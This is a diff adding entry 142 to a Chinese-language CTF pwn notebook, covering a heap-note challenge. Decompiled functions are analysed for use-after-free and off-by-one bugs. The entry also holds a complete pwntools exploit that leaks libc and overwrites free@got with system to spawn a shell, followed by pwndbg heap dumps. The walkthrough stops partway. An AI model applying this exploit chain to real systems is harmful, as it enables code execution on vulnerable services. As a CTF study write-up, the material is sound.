@@ -1,6 +1,6 @@
 ﻿---
 title: "pwn"
-lastmod: 2026-06-02T23:00:05+08:00
+lastmod: 2026-06-03T23:04:12+08:00
 draft: false
 ---
 32位最短的shellcode为21字节，内容是
@@ -6808,3 +6808,236 @@ fastbin 是单链表，后进先出。  （就是栈结构）
 2. 再 malloc(8) 给它的 content
 
 所以它会消耗两个不同大小的空闲块。真正被输入覆盖的，是第二次 malloc 拿到的那块。
+## 142
+```c
+unsigned __int64 create_heap()
+{
+  __int64 v0; // rbx
+  int i; // [rsp+4h] [rbp-2Ch]
+  size_t size; // [rsp+8h] [rbp-28h]
+  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !*((_QWORD *)&heaparray + i) )
+    {
+      *((_QWORD *)&heaparray + i) = malloc(0x10u);
+      printf("Size of Heap : ");
+      read(0, buf, 8u);
+      size = atoi(buf);
+      v0 = *((_QWORD *)&heaparray + i);
+      *(_QWORD *)(v0 + 8) = malloc(size);
+      **((_QWORD **)&heaparray + i) = size;
+      printf("Content of heap:");
+      read_input(*(_QWORD *)(*((_QWORD *)&heaparray + i) + 8LL), size);
+      puts("SuccessFul");
+      return __readfsqword(0x28u) ^ v5;
+    }
+  }
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+`*((_QWORD *)&heaparray + i)`保存堆（note0）的地址
+v0保存堆（note）的地址
+堆（note0）+8里面保存了堆（node1）的地址
+堆（node0）里面保存了堆的大小
+堆（node1）内容自定义
+```c
+unsigned __int64 delete_heap()
+{
+  int v1; // [rsp+0h] [rbp-10h]
+  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, buf, 4u);
+  v1 = atoi(buf);
+  if ( *((_QWORD *)&heaparray + v1) )
+  {
+    free(*(void **)(*((_QWORD *)&heaparray + v1) + 8LL));
+    free(*((void **)&heaparray + v1));
+    *((_QWORD *)&heaparray + v1) = 0;
+    puts("Done !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+通过堆(node0)free堆(node1)
+直接free堆(node0)
+heaparray上面的地址被清空，无法指向node0
+node1地址在没有清空的node0里面
+存在uaf漏洞
+```c
+unsigned __int64 show_heap()
+{
+  int v1; // [rsp+0h] [rbp-10h]
+  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, buf, 4u);
+  v1 = atoi(buf);
+  if ( *((_QWORD *)&heaparray + v1) )
+  {
+    printf(
+      "Size : %ld\nContent : %s\n",
+      **((_QWORD **)&heaparray + v1),
+      *(const char **)(*((_QWORD *)&heaparray + v1) + 8LL));
+    puts("Done !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+展示，将输入的地址视为指针，输出这个地址指向的字符串
+相当于我可以任意地址读取
+```c
+unsigned __int64 edit_heap()
+{
+  int v1; // [rsp+0h] [rbp-10h]
+  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, buf, 4u);
+  v1 = atoi(buf);
+  if ( *((_QWORD *)&heaparray + v1) )
+  {
+    printf("Content of heap : ");
+    read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);
+    puts("Done !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+`**((_QWORD **)&heaparray + v1) + 1LL)`这个参数的size是错的，多了1
+存在堆溢出漏洞，可以直接更改相邻的下一个堆的长度
+现在整理一下可以攻击的条件：  
+- 1.edit函数存在off-by-one，可以改物理上下一个chunck的size部分  
+- 2.chunck1中存在chunck2的指针，改写成got表可以泄露libc，也可以改写got表内容，完成劫持
+那么我们的攻击思路就出现了：  
+- 1.off-by-one攻击造成堆块复用，获得对chunck1的改写权  
+- 2.把chunck1中chunck2的指针改成got表泄露libc  
+- 3.劫持free函数的got表为system，主动触发free
+
+观察`read_input(*(_QWORD *)(*((_QWORD *)&heaparray + v1) + 8LL), **((_QWORD **)&heaparray + v1) + 1LL);`
+这句话中写到了可以对堆(node0)指向的字符串写
+node0指定的是node1，但是可以通过uaf更改node0然后形成任意写
+只要更改got表，就把覆盖got表格执行覆盖
+先给出exp，然后一步步分析
+```python
+from pwn import *
+context.binary = elf = ELF('./pwn', checksec=False)
+context.log_level = 'debug'
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+def start():
+    return process('./pwn')
+def create(io, size, data):
+    io.sendlineafter(b'Your choice :', b'1')
+    io.sendlineafter(b'Size of Heap : ', str(size).encode())
+    io.sendafter(b'Content of heap:', data)
+def edit(io, idx, data):
+    io.sendlineafter(b'Your choice :', b'2')
+    io.sendlineafter(b'Index :', str(idx).encode())
+    io.sendafter(b'Content of heap : ', data)
+def show(io, idx):
+    io.sendlineafter(b'Your choice :', b'3')
+    io.sendlineafter(b'Index :', str(idx).encode())
+def delete(io, idx):
+    io.sendlineafter(b'Your choice :', b'4')
+    io.sendlineafter(b'Index :', str(idx).encode())
+def main():
+    io = start()
+    # phase 1: leak puts from libc
+    create(io, 0x18, b'A' * 0x18)  # idx0
+    create(io, 0x10, b'B' * 0x10)  # idx1
+    edit(io, 0, b'A' * 0x18 + b'\x41')
+    delete(io, 1)
+    create(io, 0x30, b'C' * 0x20 + p64(8) + p64(elf.got['puts']))  # idx1
+    show(io, 1)
+    io.recvuntil(b'Content : ')
+    puts_leak = u64(io.recvuntil(b'\nDone !', drop=True).ljust(8, b'\x00'))
+    libc.address = puts_leak - libc.symbols['puts']
+    log.success(f'puts leak = {hex(puts_leak)}')
+    log.success(f'libc base = {hex(libc.address)}')
+    log.success(f"system = {hex(libc.symbols['system'])}")
+    # phase 2: overwrite free@got with system
+    create(io, 0x18, b'E' * 0x18)  # idx2
+    create(io, 0x10, b'F' * 0x10)  # idx3
+    edit(io, 2, b'E' * 0x18 + b'\x41')
+    delete(io, 3)
+    create(io, 0x30, b'G' * 0x20 + p64(8) + p64(elf.got['free']))  # idx3
+    edit(io, 3, p64(libc.symbols['system']))
+    # phase 3: trigger system('/bin/sh')
+    create(io, 0x10, b'/bin/sh\x00')  # idx4
+    delete(io, 4)
+    io.interactive()
+if __name__ == '__main__':
+    main()
+```
+拆解一下步骤，先是两个create，创建四个堆
+```
+pwndbg> heap
+Allocated chunk | PREV_INUSE
+Addr: 0x603000
+Size: 0x300 (with flag bits: 0x301)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603300
+Size: 0x20 (with flag bits: 0x21)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603320
+Size: 0x20 (with flag bits: 0x21)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603340
+Size: 0x20 (with flag bits: 0x21)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x603360
+Size: 0x20 (with flag bits: 0x21)
+
+Top chunk | PREV_INUSE
+Addr: 0x603380
+Size: 0x20c80 (with flag bits: 0x20c81)
+
+pwndbg> x/10gx 0x6020A0
+0x6020a0 <heaparray>:   0x0000000000603310      0x0000000000603350
+0x6020b0 <heaparray+16>:        0x0000000000000000      0x0000000000000000
+0x6020c0 <heaparray+32>:        0x0000000000000000      0x0000000000000000
+0x6020d0 <heaparray+48>:        0x0000000000000000      0x0000000000000000
+0x6020e0 <heaparray+64>:        0x0000000000000000      0x0000000000000000
+```
+从中可以明确的看出来，有两个堆结构
+这里heaparray指向的是用户区的地址
+```
+node0   0x603300
+0x0000000000000018      0x0000000000603330
+chunk0  0x603320
+0x4141414141414141      0x4141414141414141
+node1   0x603340
+0x0000000000000010      0x0000000000603370
+chunk1  0x603360
+0x4242424242424242      0x4242424242424242
+```
+这里面指向堆的指针指的是用户区，但是heap里面记录的堆的地址是从size开始的
+下一步是`edit(io, 0, b'A' * 0x18 + b'\x41')`
+这一步是让chunk0越界到node1，让node1的大小显示为41
+```
+0x603300:       0x0000000000000000      0x0000000000000021  node0头
+0x603310:       0x0000000000000018      0x0000000000603330  node0用户区
+0x603320:       0x0000000000000000      0x0000000000000021  chunk0头
+0x603330:       0x4141414141414141      0x4141414141414141  chunk0用户区
+0x603340:       0x4141414141414141      0x0000000000000041  chunk0用户区+node1头
+0x603350:       0x0000000000000010      0x0000000000603370  node1用户区
+0x603360:       0x0000000000000000      0x0000000000000021  chunk1头（node1用户区）
+0x603370:       0x4242424242424242      0x4242424242424242  chunk1用户区
+```
+因为多写了一个，就能把node1的长度覆盖掉，现在node1的长度是41
+然后是删除1
+
